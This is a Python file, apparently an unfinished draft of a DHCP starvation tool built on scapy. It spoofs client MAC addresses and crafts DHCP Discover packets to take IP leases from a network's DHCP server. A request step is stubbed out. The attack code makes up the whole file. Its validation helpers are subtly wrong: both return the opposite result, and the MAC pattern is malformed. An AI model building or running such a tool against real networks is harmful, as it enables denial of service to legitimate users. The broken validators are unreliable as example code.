from scapy.all import *
from threading import Thread
from time import sleep
import logging
import re


LOGGER = logging.getLogger()
LOG_HANDLER = logging.StreamHandler()
LOGGER.addHandler(LOG_HANDLER)

LOG_HANDLER.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))

MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
IPV4_NETWORK = "0.0.0.0"
IPV4_BROADCAST = "255.255.255.255"

'''
UTILITY FUNCTIONS
is_valid_MAC() - returns boolean
is_valid_IPV4() - returns boolean
'''

def is_valid_MAC(to_test: str) -> bool:
    '''
    Self-explanatory
    '''
    MAC_RE = r"""(^([0-9A-F]{2}[-]){5}([0-9A-F]{2})$^([0-9A-F]{2}[:]){5}([0-9A-F]{2})$)"""
    pattern = re.compile(MAC_RE, re.VERBOSE | re.IGNORECASE)

    return pattern.match(to_test) is None


def is_valid_IPV4(to_test: str) -> bool:
    '''
    Also self-explanatory
    '''
    IPV4_RE = r"""^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"""
    pattern = re.compile(IPV4_RE, re.VERBOSE | re.IGNORECASE)

    return pattern.match(to_test) is None
    

class SpoofHost():
    '''
    Class representing a legitimate host on the network as far as the DHCP server is concerned.
    Will perform a standard DHCP handshake to receive an IP address.
    '''
    def __init__(self, desired_mac: str = None):
        if desired_mac is not None and is_valid_MAC(desired_mac):
            self.mac_addr = desired_mac
        else:
            self.mac_addr = RandMAC()
        self.filter = f"udp and (port 67 or 68) and ether dst {self.mac_addr}"
        self.ipv4_addr = None

        print(self.filter)


    def sniff_callback(self, sniffed_pkt):
        '''
        Sniffs for DHCP packets, responding accordingly.
        '''
        sniffed_pkt.show()
        if DHCP in sniffed_pkt and sniffed_pkt[DHCP].options[0][1] == 2:
            # match DHCP offer
            self.dhcp_server_ip = sniffed_pkt[IP].src
            self.dhcp_server_mac = sniffed_pkt[Ether].src
            self.ipv4_addr = sniffed_pkt[BOOTP].yiaddr

            print(f"offered IP: {self.ipv4_addr}")
            

    
    def starve(self):
        '''
        Performs the actual starving functionality.
        '''
        # self.discover_pkt.show()
        dhcp_offer = srp1(self.discover_pkt)
        dhcp_offer.show()


    @property
    def discover_pkt(self):
        '''
        Crafts a DHCP Discover packet corresponding to this host.
        '''
        ether = Ether(dst=MAC_BROADCAST, src=self.mac_addr)
        ip = IP(src=IPV4_NETWORK, dst=IPV4_BROADCAST)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=self.mac_addr, xid=RandInt())
        dhcp = DHCP(options=[("message-type", "discover"), "end"])

        return ether / ip / udp / bootp / dhcp


    @property
    def request_pkt(self):
        '''
        Crafts a DHCP Request packet to respond to server upon receiving DHCP Offer.
        '''
        pass

        

if __name__ == '__main__':
    test = SpoofHost("b7:8f:0c:26:95:8f")
    test.starve()

    # print(test.discover_pkt)